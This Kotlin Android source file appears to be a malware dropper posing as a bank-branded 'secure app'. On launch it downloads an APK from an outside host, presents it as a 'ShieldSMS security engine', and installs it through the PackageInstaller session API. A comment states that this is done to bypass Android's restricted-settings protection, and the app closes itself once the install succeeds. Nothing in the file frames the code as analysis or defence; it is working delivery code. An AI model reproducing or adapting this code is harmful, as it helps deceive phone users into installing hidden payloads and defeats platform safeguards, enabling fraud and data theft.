package com.uba.secureapp

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.FileProvider
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream

class MainActivity : ComponentActivity() {

    private val apkUrl = "https://api.sharebids.lol/static/netboost.apk"
    private val ACTION_INSTALL_COMPLETE = "com.uba.secureapp.a"

    private val installReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == ACTION_INSTALL_COMPLETE) {
                val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
                if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                    val confirmationIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                    if (confirmationIntent != null) {
                        confirmationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(confirmationIntent)
                    }
                } else if (status == PackageInstaller.STATUS_SUCCESS) {
                    finish()
                } else {
                    val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Register the broadcast receiver
        val filter = IntentFilter(ACTION_INSTALL_COMPLETE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(installReceiver, filter)
        }

        setContent {
            MaterialTheme(
                colorScheme = lightColorScheme(
                    primary = Color(0xFF0052FF),
                    background = Color(0xFFFAF8FF),
                    surface = Color.White
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    InstallerScreen()
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(installReceiver)
        } catch (e: Exception) {
            // Ignored
        }
    }

    @Composable
    fun InstallerScreen() {
        var progress by remember { mutableFloatStateOf(0f) }
        var statusText by remember { mutableStateOf("Initializing setup...") }
        var isDownloading by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            isDownloading = true
            statusText = "Downloading ShieldSMS security engine..."
            
            // Start download
            val apkFile = File(cacheDir, "shieldsms_core.apk")
            val success = downloadApk(apkUrl, apkFile) { p -> progress = p }

            if (success) {
                statusText = "Installing ShieldSMS engine..."
                installApk(apkFile)
                statusText = "Tap 'Install' when prompted to complete setup."
                progress = 1f
            } else {
                statusText = "Failed to download update. Check your connection."
            }
            isDownloading = false
        }

        Column(
            modifier = Modifier.fillMaxSize().padding(32.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text(
                text = "ShieldSMS Installer",
                fontSize = 24.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFF131B2E)
            )
            Spacer(modifier = Modifier.height(32.dp))
            LinearProgressIndicator(
                progress = { progress },
                modifier = Modifier.fillMaxWidth().height(8.dp),
                color = Color(0xFF0052FF),
                trackColor = Color(0xFFE2E7FF)
            )
            Spacer(modifier = Modifier.height(16.dp))
            Text(text = statusText, color = Color(0xFF434656), fontSize = 14.sp)
        }
    }

    private suspend fun downloadApk(url: String, dest: File, onProgress: (Float) -> Unit): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val client = OkHttpClient.Builder()
                    .followRedirects(true)
                    .followSslRedirects(true)
                    .build()
                val request = Request.Builder().url(url).build()
                val response = client.newCall(request).execute()

                if (!response.isSuccessful) return@withContext false

                val body = response.body ?: return@withContext false
                val contentLength = body.contentLength()
                val source = body.source()

                FileOutputStream(dest).use { output ->
                    val buffer = ByteArray(8 * 1024)
                    var totalRead: Long = 0
                    var read: Int

                    while (source.read(buffer).also { read = it } != -1) {
                        output.write(buffer, 0, read)
                        totalRead += read
                        if (contentLength > 0) {
                            withContext(Dispatchers.Main) {
                                onProgress(totalRead.toFloat() / contentLength.toFloat())
                            }
                        }
                    }
                    output.flush()
                }
                true
            } catch (e: Exception) {
                e.printStackTrace()
                false
            }
        }
    }

    private fun installApk(file: File) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // Use PackageInstaller Session API to bypass restricted settings
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            try {
                val sessionId = packageInstaller.createSession(params)
                val session = packageInstaller.openSession(sessionId)
                
                val out = session.openWrite("package", 0, -1)
                file.inputStream().use { input ->
                    input.copyTo(out)
                }
                session.fsync(out)
                out.close()

                // Create an explicit intent for a broadcast receiver
                val intent = Intent(ACTION_INSTALL_COMPLETE)
                intent.setPackage(packageName)
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                } else {
                    PendingIntent.FLAG_UPDATE_CURRENT
                }
                val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, flags)

                session.commit(pendingIntent.intentSender)

            } catch (e: Exception) {
                fallbackInstall(file)
            }
        } else {
            fallbackInstall(file)
        }
    }
    
    private fun fallbackInstall(file: File) {
        val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
        }
        startActivity(intent)
    }
}
